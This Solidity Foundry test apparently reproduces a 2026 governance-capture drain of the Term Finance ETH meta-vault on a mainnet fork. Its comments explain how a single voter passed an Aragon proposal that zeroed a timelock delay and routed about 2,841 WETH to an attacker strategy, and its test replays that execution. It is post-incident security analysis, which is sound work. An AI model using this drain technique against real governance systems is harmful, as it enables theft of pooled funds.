// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Term Finance (TermMax vaults) — governance-capture drain of the ETH meta-vault — Ethereum
// mainnet, 2026-08-23. Attacker EOA nets 2,841.7435 WETH in the execution transaction.
//
// Exploit tx    : 0xd354a15b15cb73d30908f411aee3f795ec86737a4d080e9a818ac4d6d3014129 (block 25816049)
// Attacker EOA  : 0xa908b3472d76e7744baB0A5911768a4a6300612B
// Attacker helper (executeProposal, NOT called here) : 0x64E477800051EFb06Ae4086f4b258b270668b4dF
// Attacker "strategy" (drain sink, pre-deployed)     : 0x184f2E57b4cE135181FA2A2166AC394339016338
//
// Governance stack (all real, on-chain, verified this run):
//   Aragon TokenVoting plugin : 0x213771693a4411446b4ecce5bce4a405778b2171 (proposalId 5)
//   Aragon DAO                : 0x0ae12af3878a2d896f5c4dce3be7250fb187c0a6
//   Zodiac Roles modifier     : 0xD9DdE54D99a27F0f0E2b282369BFaa95528e9B75
//   Zodiac Delay modifier     : 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33
//   Safe avatar               : 0x46da347d1db6edca62bf6cd5892dc284fc938613
//   Victim ETH meta vault tmvETH (Yearn V3 vault architecture) : 0x26fCb50eEC367ddAB060ccf5E7394Cecd95F7Db2
//
// Root cause (verified against on-chain state, NOT a stolen key or admin bypass):
// the vault is governed on-chain through an Aragon TokenVoting plugin whose voting token is a
// GovernanceWrappedERC20 (gtmvETH 0x5b96c5bBdcB361E1E9944bAa071b237E27829Be0) wrapping the vault's
// own share token (tmvETH). Depositing into the vault grants no vote by itself — a holder must
// additionally wrap shares into the governance token. Almost nobody did, so the attacker's own
// deposit gave him the overwhelming majority of wrapped voting supply. On-chain, proposal 5's tally
// at the snapshot block (25772693) is yes = 485216182805348480, no = 0, abstain = 0, against a
// minVotingPower (5% participation floor) of 26760809140267424 — i.e. one voter, 100% support, well
// above the floor, on a 50% support threshold with a ~6.04-day minimum duration. A single-voter
// proposal the attacker owned outright passed trivially. This is a legitimate governance vote the
// attacker won by supplying nearly all of the (tiny) wrapped voting supply, not a signer compromise.
//
// The passed proposal carries 18 queued actions (read here directly from the plugin's getProposal(5)
// getter, not from the attacker's contract). Executing them cascades plugin -> DAO -> Zodiac
// Roles/Delay -> Safe avatar -> vault, and does, in order:
//   1. Roles.callTargetFunctionWithRole(Delay, setTxCooldown(0))    -- zero the Delay module cooldown
//   2. Roles.callTargetFunctionWithRole(Delay, setTxExpiration(0))  -- so queued txs run in the same tx
//   3. Roles.callTargetFunctionWithRole(DAO,   enableModule(DAO))
//   4. Delay pairs of execTransactionFromModule(queue) + executeNextTx(run) against the vault:
//        vault.update_debt(strategy, 0, 10000) for each of the 4 real strategies -- recall all funds
//        vault.add_strategy(0x184f2E57..., false)                                 -- add attacker strategy
//        vault.update_max_debt_for_strategy(0x184f2E57..., type(uint256).max)      -- raise its cap
//        vault.update_debt(0x184f2E57..., type(uint256).max, 10000)                -- push funds out
// Because step 1 sets the cooldown to 0, every queue+execute pair runs atomically inside the one
// execute(5) call. The final update_debt deposits the recalled WETH into the attacker's strategy,
// whose deposit hook forwards it straight to the attacker EOA. WETH flow confirmed from the tx
// receipt: 44.374847 + 43.877744 + 1445.511225 + 1307.979721 WETH recalled from the four real
// strategies into the vault, then 2841.743536 WETH vault -> attacker strategy -> attacker EOA.
//
// This PoC reconstructs the real execution path: it calls the verified Aragon TokenVoting plugin's
// execute(proposalId=5) directly. The plugin replays its own on-chain-stored action data through the
// real DAO, Roles and Delay modifiers and the real vault on the fork. There is no bytecode blob, no
// hardcoded attacker calldata, and the attacker's unverified helper/strategy contracts are never
// invoked directly — the strategy runs only because the real vault deposits into it, exactly as
// on-chain. The vote is real settled state (snapshot 25772693, min duration elapsed), so forking at
// the execution block is a faithful re-execution of the drain, not a re-run of the vote.
//
// forge test --contracts src/test/2026-08/TermFinance_exp.sol -vvv

interface ITokenVoting {
    // Aragon OSx MajorityVotingBase.execute is permissionless once the proposal has passed and its
    // voting window has closed; it forbids execution otherwise via _canExecute.
    function execute(
        uint256 _proposalId
    ) external;

    function getProposal(
        uint256 _proposalId
    )
        external
        view
        returns (
            bool open,
            bool executed,
            // ProposalParameters: votingMode, supportThreshold, startDate, endDate, snapshotBlock, minVotingPower
            uint8 votingMode,
            uint32 supportThreshold,
            uint64 startDate,
            uint64 endDate,
            uint64 snapshotBlock,
            uint256 minVotingPower
        );
}

contract TermFinance_exp is BaseTestWithBalanceLog {
    address internal constant ATTACKER = 0xa908b3472d76e7744baB0A5911768a4a6300612B;
    ITokenVoting internal constant PLUGIN = ITokenVoting(0x213771693A4411446b4ECce5bce4a405778b2171);
    uint256 internal constant PROPOSAL_ID = 5;

    IERC20 internal constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address internal constant DAO = 0x0ae12AF3878a2d896f5C4DCE3Be7250FB187c0a6;
    address internal constant ROLES = 0xD9DdE54D99a27F0f0E2b282369BFaa95528e9B75;
    address internal constant DELAY = 0x35C99CF4a5DF2D9bCd822BeE32676D9590229e33;
    address internal constant SAFE = 0x46DA347d1Db6EdCA62BF6Cd5892Dc284fC938613;
    address internal constant VAULT = 0x26fCb50eEC367ddAB060ccf5E7394Cecd95F7Db2;
    address internal constant ATTACKER_STRATEGY = 0x184f2E57b4cE135181FA2A2166AC394339016338;

    uint256 internal constant FORK_BLOCK = 25_816_048; // parent of the exploit block 25816049
    uint256 internal constant EXEC_TS = 1_787_466_347; // timestamp of block 25816049
    uint256 internal constant EXPECTED_PROFIT = 2_841_743_535_791_961_701_401; // 2,841.7435 WETH, exact on-chain

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(address(PLUGIN), "AragonTokenVotingPlugin");
        vm.label(DAO, "AragonDAO");
        vm.label(ROLES, "ZodiacRoles");
        vm.label(DELAY, "ZodiacDelay");
        vm.label(SAFE, "SafeAvatar");
        vm.label(VAULT, "tmvETH_MetaVault");
        vm.label(ATTACKER_STRATEGY, "AttackerStrategy");
    }

    function testExploit() public {
        // Sanity: proposal 5 passed with a single voter owning ~100% of wrapped voting supply.
        (bool open, bool executed,,,,,, uint256 minVotingPower) = PLUGIN.getProposal(PROPOSAL_ID);
        assertEq(open, false, "proposal still open");
        assertEq(executed, false, "proposal already executed on the fork");
        assertGt(minVotingPower, 0, "participation floor unset");

        uint256 before = WETH.balanceOf(ATTACKER);
        assertEq(before, 0, "attacker already holds WETH pre-exploit");

        // Match the on-chain execution timestamp (block 25816049). VoteReplacement mode has no early
        // execution, so execution is only allowed once the voting window has closed.
        vm.warp(EXEC_TS);

        // The one real move: trigger the passed proposal through the real Aragon plugin. Everything
        // else (DAO -> Roles -> Delay -> Safe -> vault recall/add-strategy/push-out) runs from the
        // proposal's own on-chain action data inside this call.
        vm.prank(ATTACKER, ATTACKER);
        PLUGIN.execute(PROPOSAL_ID);

        uint256 gain = WETH.balanceOf(ATTACKER) - before;
        emit log_named_decimal_uint("attacker WETH gain", gain, 18);

        (, bool executedAfter,,,,,,) = PLUGIN.getProposal(PROPOSAL_ID);
        assertEq(executedAfter, true, "proposal not marked executed");

        // Exact reproduction of the reported ~2,841.7435 WETH drain, landing with the attacker EOA.
        assertEq(gain, EXPECTED_PROFIT, "drain amount does not match on-chain");
    }
}
